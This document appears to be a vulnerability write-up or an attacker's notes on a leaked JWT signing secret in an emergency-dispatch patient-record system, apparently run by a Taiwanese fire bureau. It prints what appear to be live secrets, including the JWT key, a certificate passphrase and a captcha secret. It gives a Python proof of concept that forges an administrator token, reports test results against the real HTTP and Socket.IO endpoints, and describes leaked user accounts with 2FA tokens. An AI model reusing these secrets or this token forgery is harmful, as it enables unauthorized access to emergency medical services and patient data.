# EPCR JWT SECRET LEAK — Critical Vulnerability

## Summary
JWT signing secret leaked in `epcr_config.csv` (exported from database).

## Leaked Secret
- `JWT_PASSWORD = "ru/3xu4dkru4888"` (HS256)
- Also used as HTTPS cert passphrase
- Also `captcha.sessionSecret = "DNQh[f%zw6'j7,*S"`

## Impact
1. **Authentication bypass** — forge JWT for ANY user/role without password
2. **API access** — all HTTP endpoints accept forged JWTs
3. **Socket.IO CONNECT** — Socket.IO server (port 4004) accepts forged JWTs
4. **Admin escalation** — forge JWT with `role: ADMIN` + full permissions

## Proof of Concept
```python
import jwt as pyjwt
secret = "ru/3xu4dkru4888"
token = pyjwt.encode({
    "sub": "1", "account": "admin", "role": "ADMIN",
    "permissions": ["DOCTOR_TEST_PUSH", "EPCR_PAGE_CASELIST", "MONITOR_ALL"]
}, secret, algorithm="HS256")
# Send as: Authorization: Bearer <token>
```

## Verified Results
| Test | Result |
|---|---|
| Socket.IO CONNECT with forged JWT | ✅ HTTP 200 "ok" |
| Long-poll receive after CONNECT | ✅ Session held (15s, waiting for events) |
| Long-poll after first cycle | ❌ 400 "Session ID unknown" (session invalidated) |
| WebSocket transport | ❌ Server closes immediately (empty close frame) |
| HTTP `/DispatchRecords` POST | ✅ 400 (field validation — endpoint works!) |
| HTTP `/api/case/push` etc | ❌ 404 (not HTTP endpoints — Socket.IO only) |
| Socket.IO EVENT emit | ✅ HTTP 200 "ok" (accepted but no broadcast confirmed) |

## Socket.IO Push Status
- **Transport**: Handshake + CONNECT work (no auth → JWT auth)
- **Receive**: Long-polling holds session (would need real dispatch events)
- **WebSocket**: Broken (server closes connections)
- **Push**: Events accepted (200 ok) but no broadcast to other clients confirmed

## User Data Leaked
50+ accounts in `epcr_users.csv`:
- admin (消防局) with 2FA token
- mohwntp, ntpc119, emt1-50, hospitals, etc.
- Names, roles, 2FA tokens

## Files
- `data/poc_drafts/epcr_dispatch_push_broadcast.md` (updated)
- `poc_scripts/epcr_jwt_forge_v3.py` — JWT forge + Socket.IO CONNECT
- `poc_scripts/epcr_push_verify_v2.py` — authenticated long-polling listener
- `tpe119_evidence/zoomeye_results/epcr_jwt_barrier_analysis_20260928.json`
